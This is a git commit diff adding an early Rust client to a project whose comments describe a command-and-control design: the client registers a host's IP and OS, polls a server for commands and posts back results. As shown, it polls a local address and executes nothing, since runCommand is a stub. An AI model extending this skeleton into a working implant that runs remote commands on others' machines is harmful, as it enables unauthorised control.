8fa5060c92fe70d2fdd876fd1aaff2baa7245bc1
Drew Young <dmy625@comcast.net>
2022-12-28 10:44:43 -0500

    discovered how to use rust http requests and posts

--- client/src/main.rs
+++ client/src/main.rs
@@ -1,7 +1,31 @@
 //Get local IP and OS, make a POST request to [SERVER]/newHost and record identifier
 //Constantly pull the page [SERVER]/IDENTIFIER/commands and POST results to [SERVER]/IDENTIFIER/responses
 
-fn main() {
-    println!("Hello, world!");
+use reqwest::blocking::Client;
+use std::{thread,time};
+
+fn getCommands2(){
+	let client = Client::new();
+	let res = client.get("http://127.0.0.1:8080/hosts/Ubuntu1.1/commands").send().unwrap().text().unwrap();
+    postResponse(&res);
 }
 
+fn runCommand(command:&str){
+    let out = "test";
+    postResponse(&out);
+}
+
+fn postResponse(response: &str){
+    println!("{}",response);
+    let text = format!("{{\"cmd_id\": \"1\",\"response\": \"{}\"}}",response);
+    let client = reqwest::blocking::Client::new();
+    let res = client.post("http://127.0.0.1:8080/hosts/Ubuntu1.1/responses").body(text).send().unwrap();
+}
+
+fn main(){
+    let sleep_time = time::Duration::from_millis(5000);
+    loop{
+        getCommands2();
+        thread::sleep(sleep_time);
+    }
+}
